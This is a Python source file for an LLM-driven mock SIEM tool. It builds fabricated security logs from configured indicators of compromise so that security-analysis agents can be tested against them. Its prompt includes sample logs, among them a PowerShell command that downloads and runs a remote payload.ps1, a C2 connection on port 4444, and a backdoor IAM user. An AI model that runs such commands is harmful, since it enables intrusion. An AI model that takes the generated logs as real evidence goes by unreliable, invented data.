import json
import re
from typing import List, Dict, Any

from langchain_core.messages import SystemMessage, HumanMessage

from PLUGINS.LLM.llmapi import LLMAPI


class SIEMMock:
    """
    基于 LLM 的动态 SIEM 日志生成器。

    逻辑：
    1. 接收自然语言查询。
    2. 指导 LLM 根据查询和预设的失陷指标（IOCs）生成相应的JSON字符串。
    3. 解析 LLM 返回的 JSON 字符串，并将其作为工具的输出。
    """

    # ==========================================
    # 1. 核心控制配置：失陷指标列表 (IOCs)
    # 调整这里的内容，即可改变生成的日志方向
    # ==========================================
    COMPROMISED_IOCS = {
        "internal_ips": ["10.67.3.130", "10.10.10.5"],  # 受害者主机
        "attacker_ips": ["192.168.1.100", "45.33.22.11"],  # 攻击源 (内网跳板或外网C2)
        "malicious_users": ["admin", "root", "deploy"],  # 被利用的账号
        "malicious_files": ["cmd.exe", "powershell.exe", "wget", "nc.exe"],
        "hashes": ["a1b2c3d4e5f6...", "deadbeef..."]
    }

    # 内嵌的 System Prompt
    LOG_GEN_SYSTEM_PROMPT = """
# ROLE: You are a Cyber-Attack Scenario Simulator and SIEM Log Artisan. Your output is read by a program, not a human.

# PRIMARY DIRECTIVE
Generate a hyper-realistic series of 3-5 structured JSON security logs. These logs must narrate a coherent story based on a user's query and the "Ground Truth" IOCs. Consult the `LOG TYPE EXAMPLES` section as a baseline for expected fields, but do not be limited by them.

# GROUND TRUTH (Known Malicious Entities)
This is the absolute truth for your simulation. Any query involving these entities is part of a real attack.
{ioc_json}

# CHAIN OF THOUGHT (Your Internal Process)
1.  **Deconstruct Query**: Analyze the user's query (`User Query: ...`).
2.  **Correlate with Ground Truth**: Does the query relate to any "GROUND TRUTH" entities?
3.  **Embody Persona & Define Schema**: Choose a persona from the EXAMPLES or invent a new one if the query requires it (e.g., 'UEBA', 'DLP', 'Kubernetes Audit'). Based on this persona, determine the appropriate, detailed log schema. The examples are a guide, not a restriction.
4.  **Generate Log Series**: Create 3-5 log entries that narrate the scenario, using the schema you defined. Adhere to all `LOG REALISM PRINCIPLES`.

# LOG REALISM PRINCIPLES
1.  **Temporal Progression**: Timestamps (`_time`) must be chronological and close together.
2.  **Consistent Persona**: Use a consistent `hostname` and `log_source` for a given event series.
3.  **Field Correlation**: `raw_log` must plausibly represent the structured data. `event_description` must be a human-readable summary.
4.  **Plausible Details**: Use fields appropriate for the persona. An EDR log has process info; a firewall log has port/protocol info. Use `null` for inapplicable fields.
5.  **Field Richness**: Each generated log event **MUST** contain at least 15 distinct fields to be considered realistic. Populate them with plausible data. If a standard field isn't relevant, invent a custom, persona-specific one (e.g., `x_forwarded_for` for a proxy log, `pod_name` for a K8s log).

# LOG TYPE EXAMPLES & PERSONAS

---
### 1. EDR Log (CrowdStrike/SentinelOne Persona)
- **Use Case**: Tracks process executions, file modifications, and OS-level activity on endpoints.
- **Typical Fields**: `_time`, `hostname`, `log_source`, `event_description`, `process_guid`, `process_path`, `process_commandline`, `parent_process_guid`, `parent_process_commandline`, `sha256`, `username`, `tactic`, `technique`.

```json
{{
  "_time": "2025-12-01T14:30:10.554Z",
  "hostname": "DESKTOP-VICTIM1",
  "log_source": "CrowdStrike Falcon",
  "event_description": "Suspicious PowerShell execution spawned from a Microsoft Office application.",
  "process_guid": "{{d1e8-4a5f-9f43}}",
  "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "process_commandline": "powershell.exe -nop -w hidden -c \\"IEX ((new-object net.webclient).downloadstring('http://45.33.22.11/payload.ps1'))\\"",
  "parent_process_guid": "{{c0a2-1b6e-8d3a}}",
  "parent_process_commandline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE \\"C:\\Users\\victim\\Downloads\\Invoice.docx\\"",
  "sha256": "a1b2c3d4e5f6...",
  "username": "victim_user",
  "tactic": "Execution",
  "technique": "T1059.001"
}}
```
---
### 2. NDR/Firewall Log (Zeek/Palo Alto Persona)
- **Use Case**: Monitors network traffic, connections, and data transfer.
- **Typical Fields**: `_time`, `log_source`, `uid`, `id_orig_h` (src_ip), `id_orig_p` (src_port), `id_resp_h` (dest_ip), `id_resp_p` (dest_port), `proto`, `service`, `duration`, `orig_bytes`, `resp_bytes`, `conn_state`, `action`.

```json
{{
  "_time": "2025-12-01T14:30:12.801Z",
  "log_source": "Zeek",
  "event_description": "C2 heartbeat connection over non-standard port.",
  "uid": "C9a1b2c3d4e5f6a7b",
  "id_orig_h": "10.67.3.130",
  "id_orig_p": 51234,
  "id_resp_h": "45.33.22.11",
  "id_resp_p": 4444,
  "proto": "tcp",
  "service": null,
  "duration": 2.3,
  "orig_bytes": 78,
  "resp_bytes": 128,
  "conn_state": "SF",
  "action": "allowed"
}}
```
---
### 3. Cloud Log (AWS CloudTrail Persona)
- **Use Case**: Audits API calls and user activity within a cloud environment.
- **Typical Fields**: `_time`, `log_source`, `eventVersion`, `userIdentity`, `eventTime`, `eventSource`, `eventName`, `awsRegion`, `sourceIPAddress`, `userAgent`, `requestParameters`, `responseElements`, `errorCode`.

```json
{{
  "_time": "2025-12-01T09:15:00.000Z",
  "log_source": "AWS-CloudTrail",
  "event_description": "Suspicious IAM user creation from an unrecognized IP address.",
  "eventVersion": "1.08",
  "userIdentity": {{
    "type": "IAMUser",
    "principalId": "AIDACKCEVSQ6C2EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/deploy",
    "accountId": "123456789012",
    "userName": "deploy"
  }},
  "eventTime": "2025-12-01T09:15:00Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateUser",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "192.168.1.100",
  "userAgent": "aws-cli/2.0.0 Python/3.7.4",
  "requestParameters": {{"userName": "backdoor_user"}},
  "responseElements": {{"user": {{"userName": "backdoor_user"}}}},
  "errorCode": null
}}
```
---
### 4. Email Security Log (Proofpoint/M365 Defender Persona)
- **Use Case**: Inspects email messages for phishing, malware, and spam.
- **Typical Fields**: `_time`, `log_source`, `event_description`, `sender_ip`, `from_address`, `recipient_address`, `subject`, `verdict`, `threat_type`, `attachment_count`, `attachment_hashes`.

```json
{{
    "_time": "2025-12-01T11:05:19.000Z",
    "log_source": "Proofpoint-TAP",
    "event_description": "Inbound email blocked due to malicious attachment.",
    "sender_ip": "203.0.113.54",
    "from_address": "attacker@evil-domain.com",
    "recipient_address": "victim@example-corp.com",
    "subject": "Urgent: Payment Confirmation",
    "verdict": "blocked",
    "threat_type": "Malware",
    "attachment_count": 1,
    "attachment_hashes": ["deadbeef..."]
}}
```
---

# CRITICAL OUTPUT REQUIREMENTS
- Your entire response **MUST** be a single, raw JSON string representing a Python list of log objects.
- **DO NOT** include any introductory text, explanations, or markdown fences like ```json ... ```.
- The response must start with `[` and end with `]`. Any deviation will cause a system failure.
- If the query is ambiguous or there are no relevant logs, return an empty JSON list: `[]`.
"""

    @staticmethod
    def _extract_json_from_response(raw_text: str) -> List[Dict[str, Any]]:
        """
        从LLM的原始输出中稳健地提取和解析JSON列表。
        """
        # 1. 尝试直接解析整个文本
        try:
            # 假设日志是列表格式
            loaded_json = json.loads(raw_text)
            if isinstance(loaded_json, list):
                return loaded_json
        except json.JSONDecodeError:
            pass  # 如果失败，则继续尝试提取

        # 2. 尝试从Markdown代码块中提取
        match = re.search(r'```json\s*([\s\S]+?)\s*```', raw_text, re.DOTALL)
        if match:
            json_str = match.group(1).strip()
            try:
                loaded_json = json.loads(json_str)
                if isinstance(loaded_json, list):
                    return loaded_json
            except json.JSONDecodeError:
                # 如果代码块内容也不是有效的JSON，则继续
                pass

        # 3. 尝试查找第一个 '[' 和最后一个 ']' 之间的内容
        start_index = raw_text.find('[')
        end_index = raw_text.rfind(']')
        if start_index != -1 and end_index != -1 and start_index < end_index:
            json_str = raw_text[start_index:end_index + 1]
            try:
                loaded_json = json.loads(json_str)
                if isinstance(loaded_json, list):
                    return loaded_json
            except json.JSONDecodeError:
                # 如果这部分内容也不是有效的JSON，则准备抛出最终错误
                pass

        # 4. 如果所有尝试都失败，则抛出异常
        raise json.JSONDecodeError("Failed to find any valid JSON list in the LLM output.", raw_text, 0)

    @staticmethod
    def search(natural_query: str) -> List[Dict[str, Any]]:
        """
        Tool Function: Search SIEM logs using Natural Language.

        Args:
            natural_query: Description of what logs to find.
                           e.g., "Check FTP login attempts for 10.67.3.130"
        """
        print(f"[🔮 SIEM Mock] Generating logs for query: '{natural_query}'")

        # 1. 准备上下文和 Prompt
        ioc_context = json.dumps(SIEMMock.COMPROMISED_IOCS, indent=2)
        formatted_system_prompt = SIEMMock.LOG_GEN_SYSTEM_PROMPT.format(ioc_json=ioc_context)

        # 2. 调用 LLM
        response_content = ""
        try:
            llm_api = LLMAPI()
            llm = llm_api.get_model(tag="cheap")
            messages = [
                SystemMessage(content=formatted_system_prompt),
                HumanMessage(content=f"User Query: {natural_query}")
            ]
            response = llm.invoke(messages)
            response_content = response.content

            # 3. 使用稳健的解析方法提取日志
            logs = SIEMMock._extract_json_from_response(response_content)

            print(f"   [✅ SIEM Mock] Generated {len(logs)} logs.")
            return logs

        except (json.JSONDecodeError, ValueError) as e:
            # 在错误详情中包含原始输出以便调试
            raw_output = response_content if response_content else "Response content was empty."
            if isinstance(e, json.JSONDecodeError):
                # e.doc 包含传递给解码器的原始字符串
                raw_output = e.doc

            error_details = f"Model output could not be parsed as a valid JSON list. Raw output: {raw_output}"
            print(f"   [⚠️ Error] Mock generation failed: {error_details}")
            return [
                {
                    "_time": "N/A",
                    "event": "log_generation_error",
                    "details": error_details
                }
            ]
        except Exception as e:
            print(f"   [⚠️ Error] Mock generation failed with an unexpected error: {e}")
            return [
                {
                    "_time": "N/A",
                    "event": "log_generation_error",
                    "details": f"An unexpected error occurred: {e}"
                }
            ]


# =============================================================================
# 导出给 Agent 绑定的工具函数
# =============================================================================

def siem_search_tool(natural_query: str) -> List[Dict]:
    """
    Search security logs in the SIEM system.

    Args:
        natural_query: A natural language description of the logs you want to find.
                       Be specific about Time, IP, Protocol, and Action.
                       Example: 'Show me failed FTP login attempts for host 10.67.3.130 today'
                       Example: 'Any outbound connections from 10.1.1.1 to port 443?'
    """
    # 代理到 Mock 类
    return SIEMMock.search(natural_query)


# 测试代码
if __name__ == "__main__":
    # 测试 1: 查询名单里的坏 IP -> 应该返回恶意日志
    print("--- Test 1: Malicious Query ---")
    logs_bad = siem_search_tool("查询主机 10.67.3.130 的 FTP 登录日志")
    print(json.dumps(logs_bad, indent=2, ensure_ascii=False))

    # 测试 2: 查询无关 IP -> 应该返回正常或空
    print("\n--- Test 2: Benign Query ---")
    logs_good = siem_search_tool("查询主机 8.8.8.8 的相关日志")
    print(json.dumps(logs_good, indent=2, ensure_ascii=False))

    # 测试 3: 查询名单里的恶意用户 -> 应该返回可疑进程活动
    print("\n--- Test 3: Malicious User Process Query ---")
    logs_proc = siem_search_tool("检查用户 'admin' 在主机 '10.10.10.5' 上有什么进程活动")
    print(json.dumps(logs_proc, indent=2, ensure_ascii=False))
